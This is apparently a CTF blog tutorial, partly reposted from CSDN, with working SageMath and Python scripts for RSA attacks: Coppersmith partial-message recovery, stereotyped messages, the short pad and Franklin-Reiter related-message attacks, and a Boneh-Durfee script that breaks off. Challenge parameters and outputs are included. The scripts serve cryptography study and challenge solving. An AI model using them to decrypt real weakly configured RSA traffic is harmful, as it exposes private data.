<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># partial_m.sage</span><br><span class="line"></span><br><span class="line">n &#x3D; 0x00bef498e6eb2cffe71312da47ab89d2c47db7438ea2cfa992ddddbc2a01978001fc51e286e6ebf028396cdb8b3323c60e6b9d50cd84187cf7f48e3875a2f0890f70b02333ad89db2923863ce146562286f63fb0a1d0198e3a6862ba5ac12e85a5c6d0d27cb1c81bdf69cc5bc95b8001a2f744517f9437b4ddd5a076fc0e9a5de1a7a268c40f31aa29e8dc27c0b3a182299ca7a9335b4bd4585452f6107c238e486c98dd73a5f9862e9e80b152f53381c72f897107551c281259ac3ee32c4b4f46cc03127d1bf699acd0266f3c6729253c70da0c69b1560fa172735709866b375b6eba294e1ce8b46fba798ba380080b4bf9603998cac199d9cd46e30ae8da9e7f</span><br><span class="line"></span><br><span class="line">e &#x3D; 3</span><br><span class="line"></span><br><span class="line">m &#x3D; randrange(n)</span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line"></span><br><span class="line">beta &#x3D; 1</span><br><span class="line">epsilon &#x3D; beta^2&#x2F;7</span><br><span class="line"></span><br><span class="line">nbits &#x3D; n.nbits()</span><br><span class="line">kbits &#x3D; floor(nbits*(beta^2&#x2F;e-epsilon))</span><br><span class="line">mbar &#x3D; m &amp; (2^nbits-2^kbits)</span><br><span class="line">print &quot;upper %d bits (of %d bits) is given&quot; % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; (mbar + x)^e - c</span><br><span class="line"></span><br><span class="line">print m</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;1)[0]  # find root &lt; 2^kbits with factor &#x3D; n</span><br><span class="line">print mbar + x0</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge 1 [+]n&#x3D;0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7L </span><br><span class="line">[+]e&#x3D;3 </span><br><span class="line">[+]m&#x3D;random.getrandbits(512) [+]c&#x3D;pow(m,e,n)&#x3D;0x1f6f6a8e61f7b5ad8bef738f4376a96724192d8da1e3689dec7ce5d1df615e0910803317f9bafb6671ffe722e0292ce76cca399f2af1952dd31a61b37019da9cf27f82c3ecd4befc03c557efe1a5a29f9bb73c0239f62ed951955718ac0eaa3f60a4c415ef064ea33bbd61abe127c6fc808c0edb034c52c45bd20a219317fb75L [+]((m&gt;&gt;72)&lt;&lt;72)&#x3D;0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a000000000000000000L </span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Blus.King」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;q851579181q&#x2F;article&#x2F;details&#x2F;90645041</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7</span><br><span class="line"></span><br><span class="line">e &#x3D; 3</span><br><span class="line"></span><br><span class="line">m &#x3D; randrange(n)</span><br><span class="line">c &#x3D; pow(m, e, n)</span><br><span class="line"></span><br><span class="line">beta &#x3D; 1</span><br><span class="line">epsilon &#x3D; beta^2&#x2F;7</span><br><span class="line"></span><br><span class="line">nbits &#x3D; n.nbits()</span><br><span class="line">kbits &#x3D; floor(nbits*(beta^2&#x2F;e-epsilon))</span><br><span class="line">mbar &#x3D; 0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a000000000000000000</span><br><span class="line">c &#x3D; 0x1f6f6a8e61f7b5ad8bef738f4376a96724192d8da1e3689dec7ce5d1df615e0910803317f9bafb6671ffe722e0292ce76cca399f2af1952dd31a61b37019da9cf27f82c3ecd4befc03c557efe1a5a29f9bb73c0239f62ed951955718ac0eaa3f60a4c415ef064ea33bbd61abe127c6fc808c0edb034c52c45bd20a219317fb75</span><br><span class="line"></span><br><span class="line">print &quot;upper %d bits (of %d bits) is given&quot; % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; (mbar + x)^e - c</span><br><span class="line"></span><br><span class="line">print m</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;1)[0]  # find root &lt; 2^kbits with factor &#x3D; n</span><br><span class="line">print mbar + x0</span><br></pre></td></tr></table></figure>





<h6 id="Stereotyped-messages"><a href="#Stereotyped-messages" class="headerlink" title="Stereotyped messages"></a>Stereotyped messages</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">load(&quot;coppersmith.sage&quot;)</span><br><span class="line">N &#x3D; #N的值</span><br><span class="line">e &#x3D; 3 #e的值</span><br><span class="line">m &#x3D; #m的大概值</span><br><span class="line">c &#x3D; #c的值</span><br><span class="line">ZmodN &#x3D; Zmod(N)</span><br><span class="line">P.&lt;x&gt; &#x3D; PolynomialRing(ZmodN)</span><br><span class="line">f &#x3D; (m + x)^e - c</span><br><span class="line">dd &#x3D; f.degree()</span><br><span class="line">beta &#x3D; 1</span><br><span class="line">epsilon &#x3D; beta &#x2F; 7</span><br><span class="line">mm &#x3D; ceil(beta**2 &#x2F; (dd * epsilon))</span><br><span class="line">tt &#x3D; floor(dd * mm * ((1&#x2F;beta) - 1))</span><br><span class="line">XX &#x3D; ceil(N**((beta**2&#x2F;dd) - epsilon))</span><br><span class="line">roots &#x3D; coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)</span><br></pre></td></tr></table></figure>

<p> 求出的结果是与 m 的差值，既f(x)=(m+x)^e-c<em>f</em>(<em>x</em>)=(<em>m</em>+<em>x</em>)<em>e</em>−<em>c</em> 的根<br>特别的，XX 是根的上界，根据你知道的 m 的位数进行调整 </p>
<h6 id="Lattice-based-attacks"><a href="#Lattice-based-attacks" class="headerlink" title="Lattice based attacks"></a>Lattice based attacks</h6><h5 id="Coppersmith’s-Short-Pad-Attack-amp-Franklin-Reiter-Related-Message-Attack-明文高位相同-明文存在线性关系"><a href="#Coppersmith’s-Short-Pad-Attack-amp-Franklin-Reiter-Related-Message-Attack-明文高位相同-明文存在线性关系" class="headerlink" title="Coppersmith’s Short Pad Attack &amp; Franklin-Reiter Related Message Attack 明文高位相同 明文存在线性关系"></a>Coppersmith’s Short Pad Attack &amp; Franklin-Reiter Related Message Attack 明文高位相同 明文存在线性关系</h5><p> 到目前为止，这些示例假定您已经知道要查找的一些值。作为其他模式，当两个密文的明文的高位与 n（1-1 /e 2）的位数相同时，可以从它们获得明文。具体地，过程如下。 </p>
<ol>
<li><code>g1 = x^e - c1</code>和<code>g2 = (x+y)^e - c2</code>所述<a href="https://ja.wikipedia.org/wiki/終結式" target="_blank" rel="noopener">所得（合成）</a>计算，得到 y 的值作为其根</li>
<li>替换 y 的值，找到 g1（x）和 g2（x）的最大公约数，并以 m1 为根</li>
<li><code>m2 = m1 + y</code> 多获得 m2</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># coppersmiths_short_pad_attack.sage</span><br><span class="line"></span><br><span class="line">def short_pad_attack(c1, c2, e, n):</span><br><span class="line">    PRxy.&lt;x,y&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 &#x3D; x^e - c1</span><br><span class="line">    g2 &#x3D; (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 &#x3D; g1.change_ring(PRZZ)</span><br><span class="line">    q2 &#x3D; g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h &#x3D; q2.resultant(q1)</span><br><span class="line">    h &#x3D; h.univariate_polynomial()</span><br><span class="line">    h &#x3D; h.change_ring(PRx).subs(y&#x3D;xn)</span><br><span class="line">    h &#x3D; h.monic()</span><br><span class="line"></span><br><span class="line">    kbits &#x3D; n.nbits()&#x2F;&#x2F;(2*e*e)</span><br><span class="line">    diff &#x3D; h.small_roots(X&#x3D;2^kbits, beta&#x3D;0.5)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.5</span><br><span class="line"></span><br><span class="line">    return diff</span><br><span class="line"></span><br><span class="line">def related_message_attack(c1, c2, diff, e, n):</span><br><span class="line">    PRx.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    g1 &#x3D; x^e - c1</span><br><span class="line">    g2 &#x3D; (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    def gcd(g1, g2):</span><br><span class="line">        while g2:</span><br><span class="line">            g1, g2 &#x3D; g2, g1 % g2</span><br><span class="line">        return g1.monic()</span><br><span class="line"></span><br><span class="line">    return -gcd(g1, g2)[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    n &#x3D; 0x00bef498e6eb2cffe71312da47ab89d2c47db7438ea2cfa992ddddbc2a01978001fc51e286e6ebf028396cdb8b3323c60e6b9d50cd84187cf7f48e3875a2f0890f70b02333ad89db2923863ce146562286f63fb0a1d0198e3a6862ba5ac12e85a5c6d0d27cb1c81bdf69cc5bc95b8001a2f744517f9437b4ddd5a076fc0e9a5de1a7a268c40f31aa29e8dc27c0b3a182299ca7a9335b4bd4585452f6107c238e486c98dd73a5f9862e9e80b152f53381c72f897107551c281259ac3ee32c4b4f46cc03127d1bf699acd0266f3c6729253c70da0c69b1560fa172735709866b375b6eba294e1ce8b46fba798ba380080b4bf9603998cac199d9cd46e30ae8da9e7f</span><br><span class="line">    e &#x3D; 3</span><br><span class="line"></span><br><span class="line">    nbits &#x3D; n.nbits()</span><br><span class="line">    kbits &#x3D; nbits&#x2F;&#x2F;(2*e*e)</span><br><span class="line">    print &quot;upper %d bits (of %d bits) is same&quot; % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">    # ^^ &#x3D; bit-wise XOR</span><br><span class="line">    # http:&#x2F;&#x2F;doc.sagemath.org&#x2F;html&#x2F;en&#x2F;faq&#x2F;faq-usage.html#how-do-i-use-the-bitwise-xor-operator-in-sage</span><br><span class="line">    m1 &#x3D; randrange(2^nbits)</span><br><span class="line">    m2 &#x3D; m1 ^^ randrange(2^kbits)</span><br><span class="line">    c1 &#x3D; pow(m1, e, n)</span><br><span class="line">    c2 &#x3D; pow(m2, e, n)</span><br><span class="line"></span><br><span class="line">    diff &#x3D; short_pad_attack(c1, c2, e, n)</span><br><span class="line">    print &quot;difference of two messages is %d&quot; % diff</span><br><span class="line"></span><br><span class="line">    print m1</span><br><span class="line">    m1 &#x3D; related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print m1</span><br><span class="line">    print m2</span><br><span class="line">    print m1 + diff</span><br></pre></td></tr></table></figure>



<blockquote>
<p>[+]Generating challenge 5  n=0xf9526aad4d41c9b28f8bae279c7ef6b07d729d1f56e530219851f656ad521218815bdccb15167a25633a2f76969fccd3fe1ef379ded08d1a9c3307f680e952956d2b3d04cc50040efb30e40bf2562aae4b05b8ec0d5e0e0ea5fdc1b00b80dee9b6de1d77d41d8d040d3465c89133d9af23b1d43f57e70606e3433d35a47e2edL  e=3 m=random.getrandbits(512) c=pow(<strong>m</strong>,e,n)=0x798841c574b7c88ce1430d4b02bac01fc9368c71a7966176b22f9dc2e0c2f6d4d5b8a9e10dbcaa4584e667ef1afd213b78c2bdc16ba5ab909c2de2fe5a7a5fa36a390bdccf794451cd9db8489ed7870efa4a4d7d1cacacfec92e81f6bb955a4ef5d71d80631c0726d22ec3d5b115de7ff42f22e67854b59ed816e06485ab523L  x=pow(<strong>m+1</strong>,e,n)=0xe92c4c99052fa3c4bb5e54477b0afe8e18da37255269f070ffa6824492a87153e428fa4ed839b7f3249966259a0c88641185594fc2fa4881cf32b7af5b18baa6f5200453ee80e38c74dbeb90f32118e4f33e636a808e44f27e09286d109ee8f41765ad64c7afea9775974d78a80e0977a37689c7f15a23a83a87b1f5bdbcdecL  “[-]long_to_bytes(m).encode(‘hex’)=”<br>————————————————<br>版权声明：本文为CSDN博主「Blus.King」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/q851579181q/article/details/90645041" target="_blank" rel="noopener">https://blog.csdn.net/q851579181q/article/details/90645041</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">def getM2(a,b,c1,c2,n):</span><br><span class="line">    a3 &#x3D; pow(a,3,n)</span><br><span class="line">    b3&#x3D;pow(b,3,n)</span><br><span class="line">    first&#x3D;c1-a3*c2+2*b3</span><br><span class="line">    first&#x3D;first%n</span><br><span class="line">    second&#x3D;3*b*(a3*c2-b3)</span><br><span class="line">    second&#x3D;second%n</span><br><span class="line">    third&#x3D;second*gmpy2.invert(first,n)</span><br><span class="line">    third&#x3D;third%n</span><br><span class="line">    fourth&#x3D;(third+b)*gmpy2.invert(a,n)</span><br><span class="line">    return fourth%n</span><br><span class="line">#y&#x3D;ax+b</span><br><span class="line">a&#x3D;1</span><br><span class="line"># b&#x3D;1</span><br><span class="line">b&#x3D;-1</span><br><span class="line">padding2&#x3D;b</span><br><span class="line">n&#x3D;0xf9526aad4d41c9b28f8bae279c7ef6b07d729d1f56e530219851f656ad521218815bdccb15167a25633a2f76969fccd3fe1ef379ded08d1a9c3307f680e952956d2b3d04cc50040efb30e40bf2562aae4b05b8ec0d5e0e0ea5fdc1b00b80dee9b6de1d77d41d8d040d3465c89133d9af23b1d43f57e70606e3433d35a47e2ed</span><br><span class="line">c1&#x3D;0x798841c574b7c88ce1430d4b02bac01fc9368c71a7966176b22f9dc2e0c2f6d4d5b8a9e10dbcaa4584e667ef1afd213b78c2bdc16ba5ab909c2de2fe5a7a5fa36a390bdccf794451cd9db8489ed7870efa4a4d7d1cacacfec92e81f6bb955a4ef5d71d80631c0726d22ec3d5b115de7ff42f22e67854b59ed816e06485ab523</span><br><span class="line">c2&#x3D;0xe92c4c99052fa3c4bb5e54477b0afe8e18da37255269f070ffa6824492a87153e428fa4ed839b7f3249966259a0c88641185594fc2fa4881cf32b7af5b18baa6f5200453ee80e38c74dbeb90f32118e4f33e636a808e44f27e09286d109ee8f41765ad64c7afea9775974d78a80e0977a37689c7f15a23a83a87b1f5bdbcdec</span><br><span class="line">m &#x3D; getM2(a,b,c1,c2,n)-padding2</span><br><span class="line"># m&#x3D;m-2</span><br><span class="line"># 不知道为什么还要减2</span><br><span class="line"># #m &#x3D; getM2(a,b,c1,c2,n)-padding2</span><br><span class="line">print libnum.n2s(m)</span><br><span class="line">print m</span><br></pre></td></tr></table></figure>





<h5 id="Boneh-and-Durfee-attack"><a href="#Boneh-and-Durfee-attack" class="headerlink" title="Boneh and Durfee attack"></a>Boneh and Durfee attack</h5><p>d 较小时，满足 d&lt;N^0.292d&lt;N0.292  Boneh and Durfee attack 比 Wiener’s Attack 要强一些</p>
<p><strong>e非常大接近于N</strong>，跟低解密指数攻击类似，比低解密指数攻击更强，可以解决d&lt;N的0.292次方的问题</p>
<blockquote>
<p>[+]Generating challenge 6 [+]n=0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L [+]d=random.getrandbits(1024*0.270)</p>
<p> [+]e=invmod(d,phin) [+]hex(e)=0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL [+]m=random.getrandbits(512) [+]c=pow(m,e,n)=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL [-]long_to_bytes(m).encode(‘hex’)=<br>————————————————<br>版权声明：本文为CSDN博主「Blus.King」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/q851579181q/article/details/90645041" target="_blank" rel="noopener">https://blog.csdn.net/q851579181q/article/details/90645041</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">############################################</span><br><span class="line"># Config</span><br><span class="line">##########################################</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Setting debug to true will display more informations</span><br><span class="line">about the lattice, the bounds, the vectors...</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">debug &#x3D; True</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Setting strict to true will stop the algorithm (and</span><br><span class="line">return (-1, -1)) if we don&#39;t have a correct </span><br><span class="line">upperbound on the determinant. Note that this </span><br><span class="line">doesn&#39;t necesseraly mean that no solutions </span><br><span class="line">will be found since the theoretical upperbound is</span><br><span class="line">usualy far away from actual results. That is why</span><br><span 